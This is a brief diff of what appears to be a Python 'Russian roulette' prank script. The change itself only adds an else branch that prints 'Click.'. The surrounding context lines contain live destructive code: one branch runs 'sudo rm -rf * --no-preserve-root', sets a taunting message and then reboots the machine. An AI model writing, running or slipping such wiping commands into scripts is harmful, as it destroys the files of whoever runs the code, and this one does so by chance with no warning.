@@ -22,3 +22,5 @@ else:
         os.system('sudo rm -rf * --no-preserve-root')
         input = ("If you're reading this it's too late")
         os.system('sudo reboot')
+    else:
+        print("Click.")
